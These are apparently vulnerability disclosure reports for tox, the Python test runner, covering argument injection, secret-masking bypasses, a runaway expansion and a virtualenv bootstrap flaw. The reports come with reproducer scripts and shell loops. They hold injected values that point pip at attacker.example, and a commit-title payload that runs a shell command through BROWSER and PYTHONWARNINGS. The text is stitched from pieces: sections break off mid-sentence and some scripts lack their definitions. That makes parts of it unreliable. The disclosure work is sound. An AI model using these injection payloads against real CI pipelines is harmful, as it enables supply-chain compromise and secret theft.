trusted tox configuration.

## Affected code

[`Replacer._replace_match()` in `src/tox/config/loader/replacer.py`](https://github.com/tox-dev/tox/blob/ff5def6164d86e1a5bddfcbe9990d03ac995c2ae/src/tox/config/loader/replacer.py#L244)
at release commit `ff5def6164d86e1a5bddfcbe9990d03ac995c2ae`.

## Mechanism

A self reference expands repeatedly and emits warnings. The configured command does not start before the job timeout.

## Reproduction and evidence

The reporter's reproducer returned `BUG` against release 4.67.4 in an isolated container with no network access. It also
returned `BUG` against report commit `7988418936b730b19981ba934dc8b57186d6b957` and tested main commit
`d1963d076c78ed4c03c6f8c6e8fbaf9163e21f48`.

Save the Dockerfile below in the finding directory. With a source checkout at release commit
`ff5def6164d86e1a5bddfcbe9990d03ac995c2ae`, build the test image and run:

```sh
release_checkout=/path/to/tox-4.67.4
docker build -f Dockerfile.repro -t tox-sec-4.67.4 "$release_checkout"
docker run --rm --network=none -u 0 -w /src -v "$PWD/repro:/tmp/repro:ro,z" -v "$PWD/repro.d:/tmp/repro.d:ro,z" tox-sec-4.67.4 /tmp/repro
```

```text
clean case:  depth-limit warnings 1, command started True
attack case: depth-limit warnings 413200, command started False, still running after 15s True
BUG
```

### Earlier release check

The earliest reproduced version is the published 2.8.0rc1 prerelease; 2.8.0 is the earliest reproduced stable release.
[Commit `2c863a7b`](https://github.com/tox-dev/tox/commit/2c863a7b556abb8d85abeea2c3af7a32fc037929) introduced repeated
substitution expansion between 2.7.0 and 2.8.0rc1. The historical test used an INI command because tox 2.x and 3.x could
not load the reporter's TOML file. Both commands expand the same `REPORT_DIR` value.

```ini
[tox]
envlist = py38
skipsdist = true

[testenv]
commands = python -c "print('started')" --report-dir={env:REPORT_DIR}
```

Save this fixture as `tox.ini` in a new directory. With Python 3.8.20, uv 0.13.6, setuptools 75.3.4, and the
resolver-selected dependencies, the boundary check was:

```sh
for version in 2.7.0 2.8.0rc1; do
    uv venv --python 3.8 "/tmp/tox-check-$version"
    uv pip install --python "/tmp/tox-check-$version/bin/python" --prerelease allow "tox==$version" 'setuptools<81'
    env REPORT_DIR='{env:REPORT_DIR}' timeout 4s "/tmp/tox-check-$version/bin/tox" --showconfig -e py38
    printf "%s clean exit: %s\n" "$version" "$?"
    env REPORT_DIR='{env:REPORT_DIR}{env:REPORT_DIR}' timeout 4s "/tmp/tox-check-$version/bin/tox" --showconfig -e py38
    printf "%s doubled exit: %s\n" "$version" "$?"
done
```

The clean value completed. The doubled value timed out with exit 124 on 2.8.0rc1, while both values completed on 2.7.0.
The same check produced these exit codes; `124` means the four-second `timeout` stopped tox:

| tox release | Clean value | Doubled value |
| ----------- | ----------: | ------------: |
| 2.0.0       |           0 |             0 |
| 2.7.0       |           0 |             0 |
| 2.8.0rc1    |           0 |           124 |
| 2.8.0rc2    |           0 |           124 |
| 2.8.0       |           0 |           124 |
| 2.8.1       |           0 |           124 |
| 2.9.0rc1    |           0 |           124 |
| 2.9.1       |           0 |           124 |
| 3.0.0rc1    |           0 |           124 |
| 3.0.0rc2    |           0 |           124 |
| 3.0.0rc3    |           0 |           124 |
| 3.0.0rc4    |           0 |           124 |
| 3.0.0       |           0 |           124 |
| 3.1.0       |           0 |           124 |
| 3.28.0      |           0 |           124 |

For tox 4.x, the INI fixture used `env_list = py311`, `package = skip`, and the same command. The check used
`tox c -e py311 -k commands`, with Python 3.11.18 for versions through 4.40.0 and Python 3.12.16 for several later
checks. The first published tox 4 alpha, 4.0.0a2, used the `tox4` executable. The clean value exited 0 and the doubled
value timed out on every published 4.0.0 prerelease (a2–a10, b1–b3, and rc1–rc4) and on 4.0.0. The reporter also
reproduced 4.67.4; 4.67.5 completed with both values.

The affected releases have a one-release gap at 4.3.0.
[The parser rewrite in 4.3.0](https://github.com/tox-dev/tox/commit/aff1d4d8b7623de863069c1307ece6733c34d558) stopped
recursive expansion for this input.
[Commit `99b849ba`](https://github.com/tox-dev/tox/commit/99b849baca40ca97d7af87ceeb5659edb99f0882) restored recursion
in 4.3.1. Save this as `tox.ini` to reproduce the boundary:

```ini
[tox]
env_list = py311

[testenv]
package = skip
commands = python -c "print('started')" --report-dir={env:REPORT_DIR}
```

```sh
for version in 4.2.8 4.3.0 4.3.1; do
    uv venv --python 3.11 "/tmp/tox-boundary-$version"
    uv pip install --python "/tmp/tox-boundary-$version/bin/python" "tox==$version"
    env REPORT_DIR='{env:REPORT_DIR}' timeout 3s "/tmp/tox-boundary-$version/bin/tox" c -e py311 -k commands
    printf "%s clean exit: %s\n" "$version" "$?"
    env REPORT_DIR='{env:REPORT_DIR}{env:REPORT_DIR}' timeout 3s \
        "/tmp/tox-boundary-$version/bin/tox" c -e py311 -k commands
    printf "%s doubled exit: %s\n" "$version" "$?"
done
```

The clean value exited 0 on all three releases. The doubled value exited 124 on 4.2.8 and 4.3.1. On 4.3.0 it exited 0
and config output retained the literal doubled reference. Tests after each substantive tagged change to the replacement
modules through 4.67.3 still timed out; the affected-release checklist records those tested releases. Intervening
releases not listed there were not run individually.

## Attack sequence

```mermaid
sequenceDiagram
    participant A as Input author
    participant J as Trusted run
    participant T as tox
    participant S as Reference expander
    A->>J: provide a doubled self reference
    J->>+T: run with the stated input
    T->>S: expand each branch until the depth limit
```

source at `/src` and the project installed in `/opt/venv`.

```python
import os

import subprocess

project = tempfile.mkdtemp(prefix="tox-expansion-")

single_reference = "{env:REPORT_DIR}"
clean = subprocess.run(
    tox,
    cwd=project,
    env={**os.environ, "REPORT_DIR": single_reference},
    capture_output=True,
    text=True,
    timeout=time_limit_s,
    check=True,
)

print(clean.stdout)

attack_log = os.path.join(project, "attack.log")

    try:
        subprocess.run(
            tox,
            cwd=project,
            env={**os.environ, "REPORT_DIR": double_reference},
            stdout=log,
            stderr=subprocess.STDOUT,
            timeout=time_limit_s,
        )
        still_running = False
    except subprocess.TimeoutExpired:  # subprocess.run kills tox before raising
        still_running = True
attack_output = open(attack_log).read()

# check: with two references tox must still finish; instead it warns without end and never spawns the command
print(f"--- REPORT_DIR={double_reference} ---")
print(attack_output[:300])
print(
    f"clean case:  depth-limit warnings {clean.stdout.count(depth_limit_warning)}, "
    f"command started {'commands[0]>' in clean.stdout}"
)
print(
    f"attack case: depth-limit warnings {attack_output.count(depth_limit_warning)}, "
    f"command started {'commands[0]>' in attack_output}, still running after {time_limit_s}s {still_running}"
)
```

description:
## Summary

Reused dependency value adds a command option. Anthropic OSS Scanner reported this as ANT-2026-JI840B1P on 2026-10-22.

## Affected area

INI deps reference expansion.

## Attacker-controlled input

One outside-controlled value substituted into a find-links operand reused by a command. The attacker does not need to
edit the trusted tox configuration.

## Affected code

[`_PythonRequirementsFile.lines()` in `src/tox/tox_env/python/pip/req_file.py`](https://github.com/tox-dev/tox/blob/ff5def6164d86e1a5bddfcbe9990d03ac995c2ae/src/tox/tox_env/python/pip/req_file.py#L74)
at release commit `ff5def6164d86e1a5bddfcbe9990d03ac995c2ae`.

## Mechanism

The deps reference loses its operand boundary. The configured command receives an added index option in argv. See
[pip install options](https://pip.pypa.io/en/stable/cli/pip_install/) for parser behavior.

## Reproduction and evidence

The reporter's reproducer returned `BUG` against release 4.67.4 in an isolated container with no network access. It also
returned `BUG` against report commit `7988418936b730b19981ba934dc8b57186d6b957` and tested main commit
`d1963d076c78ed4c03c6f8c6e8fbaf9163e21f48`.

Save the Dockerfile below in the finding directory. With a source checkout at release commit
`ff5def6164d86e1a5bddfcbe9990d03ac995c2ae`, build the test image and run:

```sh
release_checkout=/path/to/tox-4.67.4
docker build -f Dockerfile.repro -t tox-sec-4.67.4 "$release_checkout"
docker run --rm --network=none -u 0 -w /src -v "$PWD/repro:/tmp/repro:ro,z" -v "$PWD/repro.d:/tmp/repro.d:ro,z" tox-sec-4.67.4 /tmp/repro
```

```text
CONTROL  tox's own install of deps: ['install', 'demo-pkg', '-f', 'wheelhouse/stable --index-url=https://attacker.example/simple']
OBSERVED command with {deps}      : ['download', '-f', 'wheelhouse/stable', '--index-url=https://attacker.example/simple', 'demo-pkg']
BUG
```

### Earlier release check

The earliest reproduced release is 4.64.8.
[Commit `1df83f19`](https://github.com/tox-dev/tox/commit/1df83f19e8d7a91aecb82fb63b27ef3f5415a585) changed dependency
rendering in that release. Save the published `tox.ini` and `pip_stand_in.py` in one directory. The historical check
selected `py312` and ran an installed tox wheel. Python was 3.12.16; the 4.64.8 environment had virtualenv 21.15.2 and
python-discovery 1.9.0.

```sh
for version in 4.64.7 4.64.8 4.67.5; do
    uv venv --python 3.12 "/tmp/tox-check-$version"
    uv pip install --python "/tmp/tox-check-$version/bin/python" "tox==$version"
    mkdir -p "/tmp/tox-repro-$version"
    cp tox.ini pip_stand_in.py "/tmp/tox-repro-$version/"
    (
        cd "/tmp/tox-repro-$version"
        PATH="/tmp/tox-check-$version/bin:$PATH" \
            WHEEL_CHANNEL='stable --index-url=https://attacker.example/simple' \
            "/tmp/tox-check-$version/bin/tox" run -e py312 --result-json result.json
    )
    jq -c '
        [.testenvs.py312 | (.setup + .test)[]
         | select(.run_id == "install_deps" or .run_id == "commands[0]")
         | {id:.run_id,args:.command[2:]}]
    ' "/tmp/tox-repro-$version/result.json"
done
```

The relevant argument arrays were:

```text
4.64.7 install_deps: ["install","demo-pkg","-f","wheelhouse/stable --index-url=https://attacker.example/simple"]
4.64.7 commands[0]: ["download","--find-links","wheelhouse/stable --index-url=https://attacker.example/simple"]
4.64.8 install_deps: ["install","demo-pkg","-f","wheelhouse/stable --index-url=https://attacker.example/simple"]
4.64.8 commands[0]: ["download","-f","wheelhouse/stable","--index-url=https://attacker.example/simple","demo-pkg"]
4.67.5 commands[0]: ["download","-f","wheelhouse/stable --index-url=https://attacker.example/simple","demo-pkg"]
```

On 4.64.7, the old command parser treated `demo-pkg` as a separate command and the run exited 2. Its recorded
`commands[0]` still kept the find-links operand whole. The reporter's 4.67.4 run also split that operand; 4.67.5 kept it
whole. Between 4.64.8 and 4.67.4, the only change to `req_file.py` was a typing import; this check did not run each
intermediate release.

## Attack sequence

```mermaid
sequenceDiagram
    participant A as Input author
    participant J as Trusted run
    participant T as tox
    participant S as Command parser
    A->>J: provide a substituted find-links operand
    J->>+T: run with the stated input
    T->>S: expand a deps reference without preserving the operand boundary
    Note over T,S: the configured command receives an added index option
    deactivate T
```

## Reproducer files

The `repro` and `repro.d` files below are from the reporter's finding directory. The test image contains the 4.67.4
source at `/src` and the project installed in `/opt/venv`.

**repro**

```python
#!/usr/bin/env python3
import json
import os
import shutil
import subprocess
import tempfile
from pathlib import Path

# set up: the project owner's checkout
project = Path(tempfile.mkdtemp(prefix="tox-deps-reference-"))
shutil.copy("/tmp/repro.d/tox.ini", project)
shutil.copy("/tmp/repro.d/pip_stand_in.py", project)

# attack: the attacker sets only WHEEL_CHANNEL, which tox.ini puts inside the --find-links operand of deps
injected_option = "--index-url=https://attacker.example/simple"
wheel_channel = f"stable {injected_option}"
subprocess.run(
    ["tox", "run", "-e", "py", "--result-json", "result.json"],
    cwd=project,
    env={**os.environ, "WHEEL_CHANNEL": wheel_channel},
    check=True,
)

# check: the command's {deps} must carry the -f operand as the one argument tox's own install of deps gets
journal = json.loads((project / "result.json").read_text())["testenvs"]["py"]
# [2:] drops "python pip_stand_in.py"
argv = {step["run_id"]: step["command"][2:] for step in journal["setup"] + journal["test"]}
install_argv = argv["install_deps"]
command_argv = argv["commands[0]"]
print()
print("CONTROL  tox's own install of deps:", install_argv)
print("OBSERVED command with {deps}      :", command_argv)
install_keeps_one_operand = f"wheelhouse/{wheel_channel}" in install_argv
command_gains_an_option = injected_option in command_argv
print("BUG" if install_keeps_one_operand and command_gains_an_option else "OK")
```

**repro.d/pip_stand_in.py**

```python
"""Takes the place of pip: accepts any arguments and does nothing. tox's result journal records its argv."""
```

**repro.d/tox.ini**

```ini
[tox]
no_package = true

[testenv]
deps =
    --find-links wheelhouse/{env:WHEEL_CHANNEL:stable}
    demo-pkg
# pip_stand_in.py takes the place of "python -m pip" in both settings, so nothing is fetched
install_command = python pip_stand_in.py install {opts} {packages}
commands =
    python pip_stand_in.py download {deps}
```

**Dockerfile.repro (test harness)**

```dockerfile
FROM python:3.15-bookworm
ENV DEBIAN_FRONTEND=noninteractive \
    PIP_DISABLE_PIP_VERSION_CHECK=1

RUN apt-get update && apt-get install -y --no-install-recommends man-db passwd \
    && rm -rf /var/lib/apt/lists/* \
    && useradd --create-home --shell /bin/bash scanner-test

RUN python -m venv /opt/venv
ENV PATH=/opt/venv/bin:$PATH

COPY . /src
WORKDIR /src

RUN pip install --upgrade pip \
    && { git describe --tags >/dev/null 2>&1 || export SETUPTOOLS_SCM_PRETEND_VERSION=0.0.0; } \
    && pip install -e '.[completion]' --group test \
    && pip wheel --no-deps --wheel-dir /opt/wheels .

RUN chown -R scanner-test:scanner-test /src && git config --global --add safe.directory /src
```

## Impact

An INI {deps} reference drops escaping from an outside-supplied --find-links operand and adds a command option. The
reproduction does not establish a wider effect. Exposure is unlikely because the attack needs one outside-controlled
value substituted into a find-links operand reused by a command.

For scoring, the conditional path is a trusted CI job forwarding outside-supplied data into this setting without
granting its source access to the tox host. The reproducer does not establish that such a job is deployed.

Severity: CVSS v4.0 base 2.0 (`CVSS:4.0/AV:L/AC:L/AT:P/PR:N/UI:P/VC:N/VI:L/VA:N/SC:N/SI:N/SA:N`). Metric reasons:

- `AV:L`: The reproducer runs tox on the host with the triggering value or path; it shows no network route into tox.
- `AC:L`: The reproducer requires no target-specific secret or evasion technique.
- `AT:P`: The trusted configuration must reuse a substituted `--find-links` dependency operand in an INI command.
- `PR:N`: The conditional outside source needs no prior privilege on the tox host.
- `UI:P`: A trusted user or job must run tox with the supplied input.
- `VC:N`: No disclosure appears in the reproduction.
- `VI:L`: The supplied value adds one command option.
- `VA:N`: No loss of availability appears in the reproduction.
- `SC:N`: No other system disclosed data in the test.
- `SI:N`: The reproduction does not establish an integrity impact on a subsequent system.
- `SA:N`: The test shows no outage in another system.

## Versions tested

The reproducer confirms 4.67.4, report commit `7988418936b730b19981ba934dc8b57186d6b957`, and main commit
`d1963d076c78ed4c03c6f8c6e8fbaf9163e21f48`. The same isolated reproducer returned `OK` with
[fix commit `621900c6e2043d02aa1ee3a92bbbdd6d2811e5be`](https://github.com/gaborbernat/tox/commit/621900c6e2043d02aa1ee3a92bbbdd6d2811e5be)
in [public PR #4276](https://github.com/tox-dev/tox/pull/4276).

[tox 4.67.5](https://github.com/tox-dev/tox/releases/tag/4.67.5) includes the fix.

The published reproducer returned `BUG` on all 16 published releases from 4.64.8 through 4.67.4, checked below. Each run
used a PyPI package in a Python 3.11 container with network access disabled at runtime. `install_deps` received the URL

reproducer returned `OK` on 4.67.5.

The 4.64.7 command template tried to run `demo-pkg` as another command, so the original harness stopped before reading
its result journal. Changing only `check=True` to `check=False` let the harness read the journal: 4.64.7 kept the URL
inside one `--find-links` argument.

## Known mitigation

description:
## Summary

Virtualenv spec installs an unrequested package. Anthropic OSS Scanner reported this as ANT-2026-L4LYQNXT on 2026-10-22.

## Affected area

Virtualenv bootstrap.

## Attacker-controlled input

One outside-controlled value substituted into virtualenv_spec. The attacker does not need to edit the trusted tox
configuration.

## Affected code

[`ensure_bootstrap()` in `src/tox/tox_env/python/virtual_env/subprocess_adapter.py`](https://github.com/tox-dev/tox/blob/ff5def6164d86e1a5bddfcbe9990d03ac995c2ae/src/tox/tox_env/python/virtual_env/subprocess_adapter.py#L220)
at release commit `ff5def6164d86e1a5bddfcbe9990d03ac995c2ae`.

## Mechanism

The substituted value becomes a pip requirement option. pip fetches a requirements file, installs another virtualenv
package, and its code runs. See [pip install options](https://pip.pypa.io/en/stable/cli/pip_install/) for parser
behavior.

## Reproduction and evidence

The reporter's reproducer returned `BUG` against release 4.67.4 in an isolated container with no network access. It also
returned `BUG` against report commit `7988418936b730b19981ba934dc8b57186d6b957` and tested main commit
`d1963d076c78ed4c03c6f8c6e8fbaf9163e21f48`.

Save the Dockerfile below in the finding directory. With a source checkout at release commit
`ff5def6164d86e1a5bddfcbe9990d03ac995c2ae`, build the test image and run:

```sh
release_checkout=/path/to/tox-4.67.4
docker build -f Dockerfile.repro -t tox-sec-4.67.4 "$release_checkout"
docker run --rm --network=none -u 0 -w /src -v "$PWD/repro:/tmp/repro:ro,z" -v "$PWD/repro.d:/tmp/repro.d:ro,z" tox-sec-4.67.4 /tmp/repro
```

```text
CONTROL  virtualenv in the bootstrap environment: ['virtualenv-21.15.1.dist-info']
CONTROL  attacker code ran: False
OBSERVED requests to the attacker's server:
OBSERVED virtualenv in the bootstrap environment: ['virtualenv-99.dist-info']
OBSERVED attacker code ran: uid=0 argv=['/tmp/virtualenv-spec-f63c4l7r/attack/.tox/.virtualenv-bootstrap/4dbc7b2a59c1e83b/lib/python3.15/site-packages/virtualenv/__main__.py', '/tmp/virtualenv-spec-f63c4l7r/attack/.tox/legacy']
BUG
```

### Earlier release check

The earliest reproduced release is 4.42.0.
[Commit `c80c62f6`](https://github.com/tox-dev/tox/commit/c80c62f60d7017f91c2a7d035d045170f8523362) introduced
`virtualenv_spec` after 4.41.0. Save the published `repro` and `repro.d` files in one directory. The historical checks
used Python 3.12.16, virtualenv 21.15.2, and python-discovery 1.9.0. The checks replaced the hard-coded `/opt/venv/bin`
and `/tmp/repro.d` paths with the installed wheel and copied fixtures. They used separate local HTTP ports to avoid
collisions and kept `tox.toml` and the requirements file content intact.

```sh
version=4.42.0
port=18765
env_dir="/tmp/tox-check-$version"
repro_dir="/tmp/tox-rxj7-$version"
uv venv --python 3.12 "$env_dir"
uv pip install --python "$env_dir/bin/python" "tox==$version"
mkdir -p "$repro_dir"
cp -R repro repro.d "$repro_dir/"
sed -i "s#/opt/venv/bin#$env_dir/bin#g; s#/tmp/repro.d#$repro_dir/repro.d#g; s#8765#$port#g" "$repro_dir/repro"
sed -i "s#8765#$port#g" "$repro_dir/repro.d/attacker_server.py" "$repro_dir/repro.d/attacker_requirements.txt"
(cd "$repro_dir" && PATH="$env_dir/bin:$PATH" timeout 45s "$env_dir/bin/python" repro)
```

The same procedure used port 18766 for 4.41.0, port 18767 for 4.56.0, and port 18768 for 4.67.5. The relevant output
was:

```text
4.41.0: no requests to the local server; attacker code ran: False; OK
4.42.0: GET /requirements.txt 200; GET /virtualenv-99-py3-none-any.whl 200
        virtualenv-99.dist-info installed; attacker code ran; BUG
4.56.0: GET /requirements.txt 200; virtualenv-99.dist-info installed; attacker code ran; BUG
4.67.5: no requests to the local server; attacker code ran: False; OK
```

The 4.42.0 and 4.56.0 runs wrote the sentinel from the attacker's `virtualenv/__main__.py` under the tox account. The
reporter also reproduced this effect on 4.67.4; the 4.56.0 test covers the later automatic virtualenv pinning change.

The same fixture was then run against all 73 stable PyPI releases from 4.42.0 through 4.67.4, with separate local ports
19000–19072. Every run exited 0, fetched `/requirements.txt` and the wheel, installed `virtualenv-99.dist-info`, and
wrote the attacker sentinel; the control wrote none. Versions 4.41.0 and 4.67.5 returned `OK` without either request or
sentinel. All affected release tags retained the unvalidated `virtualenv_spec` argument to pip in `ensure_bootstrap()`;
changes to that adapter did not alter this call.

## Attack sequence

```mermaid
sequenceDiagram
    participant A as Input author
    participant J as Trusted run
```

## Summary

Debug output prints a forwarded secret. Anthropic OSS Scanner reported this as ANT-2026-4SQTH0JG on 2026-10-22.

## Affected area

tox's virtualenv debug reporting.

## Attacker-controlled input

Read access to debug output from a -vv run using virtualenv's pip seeder. The attacker does not need to edit the trusted
tox configuration.

## Affected code

[`ToxHandler.format()` and `setup_report()` in `src/tox/report.py`](https://github.com/tox-dev/tox/blob/ff5def6164d86e1a5bddfcbe9990d03ac995c2ae/src/tox/report.py#L212-L249)
at release commit `ff5def6164d86e1a5bddfcbe9990d03ac995c2ae`.

## Mechanism

At -vv, tox forwards virtualenv's debug message with the raw environment. The message includes a forwarded secret that
tox masks elsewhere.

## Reproduction and evidence

The reporter's reproducer returned `BUG` against release 4.67.4 in an isolated container with no network access. It also
returned `BUG` against report commit `7988418936b730b19981ba934dc8b57186d6b957` and tested main commit
`d1963d076c78ed4c03c6f8c6e8fbaf9163e21f48`.

```python
import secrets

import subprocess

# set up: a project that forwards one secret, and a CI job that holds it
project = Path(tempfile.mkdtemp(prefix="project-"))
shutil.copy("/tmp/repro.d/tox.ini", project)
deploy_token = secrets.token_hex(16)  # "token" in the name puts it under tox's redaction rule
ci_environment = {
    "PATH": os.environ["PATH"],
    "HOME": os.environ["HOME"],
    "DEPLOY_TOKEN": deploy_token,
    "VIRTUALENV_SEEDER": "pip",  # non-default: virtualenv's pip seeder instead of app-data
}

# the CI job runs tox at debug verbosity (-vv, also non-default)
tox = subprocess.run(
    ["tox", "run", "-e", "py", "-vv"],
    cwd=project,
    env=ci_environment,
    capture_output=True,
    text=True,
    check=True,

leaked_lines = [

]
for line in leaked_lines:
    print("OBSERVED tox -vv stdout:", line)

masked_in_log = masked_line == "env DEPLOY_TOKEN: " + "*" * len(deploy_token)
print("BUG" if masked_in_log and leaked_lines else "OK")
```

```python
import os
import shutil
import subprocess
import sys
import tempfile

project = Path(tempfile.mkdtemp(prefix="tox-project-"))
for name in ("tox.toml", "save_env.py", "write_ci_env.py"):
    shutil.copy(f"/tmp/repro.d/{name}", project)
marker = project / "ran-by-commit-title.txt"
# tox passes PIP_* and other variables from its caller on to the command; with PATH only,
# anything else the command sees comes from tox itself or from ci.env
tox_caller_env = {"PATH": os.environ["PATH"]}


def ci_job(commit_title):
    marker.unlink(missing_ok=True)
    step_env = {**tox_caller_env, "CI_COMMIT_TITLE": commit_title}
    subprocess.run([sys.executable, "write_ci_env.py"], cwd=project, env=step_env, check=True)
    subprocess.run(["/opt/venv/bin/tox", "run", "-e", "py"], cwd=project, env=tox_caller_env, check=True)
    with open(project / "ci.env", encoding="utf-8") as ci_env:
        ci_env_lines = ci_env.readlines()
    command_env = json.loads((project / "command_env.json").read_text(encoding="utf-8"))
    marker_text = marker.read_text().strip() if marker.exists() else None
    return ci_env_lines, command_env, marker_text

pieces = [
    "Fix typo",
    "PIP_INDEX_URL=http://attacker.example/simple",
    "PYTHONWARNINGS=all:0:antigravity.x:0:0",  # python imports antigravity to look up the category; that runs $BROWSER
    f'BROWSER=sh -c "id > {marker.name}" %s',
]
control_title = " ".join(pieces)
attack_title = "\u2028".join(pieces)  # U+2028 LINE SEPARATOR, not a line end for Python's file reader

# the CI job, once per title
control_lines, control_env, control_marker = ci_job(control_title)
attack_lines, attack_env, attack_marker = ci_job(attack_title)

# check: ci.env holds two lines both times, so the command should get the title whole in COMMIT_TITLE
for label, lines, env, marker_text in (
    ("CONTROL ", control_lines, control_env, control_marker),
    ("OBSERVED", attack_lines, attack_env, attack_marker),
):
    print(f"{label} ci.env has {len(lines)} lines: {lines!a}")
    for name in ("COMMIT_TITLE", "BUILD_NUMBER", "PIP_INDEX_URL", "PYTHONWARNINGS", "BROWSER"):
        print(f"{label} command got {name}={env.get(name)!a}")
    print(f"{label} {marker.name}: {marker_text!r}")

id_output = subprocess.run(["id"], capture_output=True, text=True, check=True).stdout.strip()
control_title_whole = (
    control_env["COMMIT_TITLE"] == control_title and "PIP_INDEX_URL" not in control_env and control_marker is None
)
attack_title_split = (
    len(attack_lines) == 2
    and attack_env["COMMIT_TITLE"] == "Fix typo"
    and attack_env.get("PIP_INDEX_URL") == "http://attacker.example/simple"
    and attack_marker == id_output
)
print("BUG" if control_title_whole and attack_title_split else "OK")
```

summary: Apostrophe exposes a masked command token
description:
## Summary

Apostrophe exposes a masked command token. Anthropic OSS Scanner reported this as ANT-2026-DG5LSTFN on 2026-10-22.

## Affected area

Command argument redaction.

## Attacker-controlled input

One outside-controlled value before an inline secret flag in an INI command. The attacker does not need to edit the
trusted tox configuration.

## Affected code

[`redact_argv()` in `src/tox/util/redact.py`](https://github.com/tox-dev/tox/blob/ff5def6164d86e1a5bddfcbe9990d03ac995c2ae/src/tox/util/redact.py#L65)
at release commit `ff5def6164d86e1a5bddfcbe9990d03ac995c2ae`.

## Mechanism

Apostrophe handling joins the value and the following flag into one argument. Redaction misses the flag and tox prints
its secret.

## Reproduction and evidence

The reporter's reproducer returned `BUG` against release 4.67.4 in an isolated container with no network access. It also
returned `BUG` against report commit `7988418936b730b19981ba934dc8b57186d6b957` and tested main commit
`d1963d076c78ed4c03c6f8c6e8fbaf9163e21f48`.

Save the Dockerfile below in the finding directory. With a source checkout at release commit
`ff5def6164d86e1a5bddfcbe9990d03ac995c2ae`, build the test image and run:

```sh
release_checkout=/path/to/tox-4.67.4
docker build -f Dockerfile.repro -t tox-sec-4.67.4 "$release_checkout"
docker run --rm --network=none -u 0 -w /src -v "$PWD/repro:/tmp/repro:ro,z" -v "$PWD/repro.d:/tmp/repro.d:ro,z" tox-sec-4.67.4 /tmp/repro
```

```text
CONTROL  GIT_REF=main  spawned argv: ['deploy.py', '--ref=main', '--token=82bc90e7943f9b2d826724dd94ec4572']
CONTROL  GIT_REF=main  tox wrote: deploy: commands[0]> python deploy.py --ref=main '--token=********************************'
CONTROL  GIT_REF=main  tox wrote: cmd: python deploy.py --ref=main '--token=********************************'
OBSERVED GIT_REF=it's  spawned argv: ['deploy.py', "--ref=it's --token=82bc90e7943f9b2d826724dd94ec4572"]
OBSERVED GIT_REF=it's  tox wrote: deploy: commands[0]> python deploy.py '--ref=it'"'"'s --token=82bc90e7943f9b2d826724dd94ec4572'
OBSERVED GIT_REF=it's  tox wrote: cmd: python deploy.py '--ref=it'"'"'s --token=82bc90e7943f9b2d826724dd94ec4572'
BUG
```

### Historical release check

The same reproduction first shows a masking bypass in 4.53.1. In 4.53.0, the control token is also unmasked, so `OK`
means the apostrophe did not bypass an existing mask; it does not mean that older output protected the token.

**Dockerfile.history**

```dockerfile
FROM python:3.11-bookworm
ARG TOX_VERSION
RUN python -m venv /opt/venv \
    && /opt/venv/bin/pip install --disable-pip-version-check --quiet "tox==${TOX_VERSION}"
ENV PATH=/opt/venv/bin:$PATH
```

**Commands**

```sh
for version in 4.53.0 4.53.1; do
    docker build -q -f Dockerfile.history --build-arg TOX_VERSION="$version" \
        -t "tox-history-5chh:$version" . >/dev/null
    printf '%s ' "$version"
    docker run --rm --network=none \
        -v "$PWD/repro:/tmp/repro:ro,z" -v "$PWD/repro.d:/tmp/repro.d:ro,z" \
        "tox-history-5chh:$version" python /tmp/repro | tail -1
done
```

**Observed**

```text
4.53.0 OK
4.53.1 BUG
```

## Attack sequence

```mermaid
sequenceDiagram
    participant J as Job owner
    participant T as tox
    participant O as Command output
    participant R as Reader
    participant A as Input author
    A->>J: provide a value with an apostrophe before the secret flag
    J->>+T: run with a sensitive value
    T->>O: write the command with an inline secret flag
    Note over T,O: an apostrophe joins the flag into one argument, so masking misses its value
    deactivate T
    R->>O: read the tox output
```

## Reproducer files

The `repro` and `repro.d` files below are from the reporter's finding directory. The test image contains the 4.67.4
source at `/src` and the project installed in `/opt/venv`.

**repro**

```python
#!/usr/bin/env python3
import json
import secrets
import shutil
import subprocess
import tempfile
from pathlib import Path

DEPLOY_TOKEN = secrets.token_hex(16)


def tox_run_deploy(git_ref):
    project = Path(tempfile.mkdtemp()) / "project"
    shutil.copytree("/tmp/repro.d", project)
    # only these variables, so the token can reach tox's output through the command line and nowhere else
    env = {
        "PATH": "/opt/venv/bin:/usr/bin:/bin",
        "HOME": str(Path.home()),
        "GIT_REF": git_ref,
        "DEPLOY_TOKEN": DEPLOY_TOKEN,
    }
    tox = subprocess.run(
        ["/opt/venv/bin/tox", "run", "-e", "deploy"], cwd=project, env=env, capture_output=True, text=True, check=True
    )
    command_log = (project / ".tox/deploy/log/1-commands[0].log").read_text()
    spawned_argv = json.loads((project / "spawned_argv.json").read_text())
    return spawned_argv, tox.stdout + tox.stderr + command_log


# control: an ordinary branch name
control_argv, control_output = tox_run_deploy("main")

# attack: the contributor's branch name, one apostrophe
attack_argv, attack_output = tox_run_deploy("it's")

# check: tox must mask the token in its echo and log whatever GIT_REF holds
print(f"DEPLOY_TOKEN {DEPLOY_TOKEN}")
print(f"CONTROL  GIT_REF=main  spawned argv: {control_argv}")
for line in control_output.splitlines():
    if "deploy.py" in line:
        print(f"CONTROL  GIT_REF=main  tox wrote: {line}")
print(f"OBSERVED GIT_REF=it's  spawned argv: {attack_argv}")
for line in attack_output.splitlines():
    if "deploy.py" in line:
        print(f"OBSERVED GIT_REF=it's  tox wrote: {line}")

token_was_passed = f"--token={DEPLOY_TOKEN}" in control_argv
masked_in_control = DEPLOY_TOKEN not in control_output
leaked_in_attack = DEPLOY_TOKEN in attack_output
print("BUG" if token_was_passed and masked_in_control and leaked_in_attack else "OK")
```

**repro.d/deploy.py**

```python
import json
import sys

# prints nothing, so every line on the terminal and in the command log is tox's own
with open("spawned_argv.json", "w") as file:
    json.dump(sys.argv, file)
```

**repro.d/tox.ini**

```ini
[tox]
no_package = true

[testenv:deploy]
commands = python deploy.py --ref={env:GIT_REF} --token={env:DEPLOY_TOKEN}
```

**Dockerfile.repro (test harness)**

```dockerfile
FROM python:3.15-bookworm
ENV DEBIAN_FRONTEND=noninteractive \
    PIP_DISABLE_PIP_VERSION_CHECK=1

RUN apt-get update && apt-get install -y --no-install-recommends man-db passwd \
    && rm -rf /var/lib/apt/lists/* \
    && useradd --create-home --shell /bin/bash scanner-test

RUN python -m venv /opt/venv
ENV PATH=/opt/venv/bin:$PATH

COPY . /src
WORKDIR /src

RUN pip install --upgrade pip \
    && { git describe --tags >/dev/null 2>&1 || export SETUPTOOLS_SCM_PRETEND_VERSION=0.0.0; } \
    && pip install -e '.[completion]' --group test \
    && pip wheel --no-deps --wheel-dir /opt/wheels .

RUN chown -R scanner-test:scanner-test /src && git config --global --add safe.directory /src
```

## Impact

An apostrophe in an outside-supplied value prevents masking of the following --token value. The reproduction does not
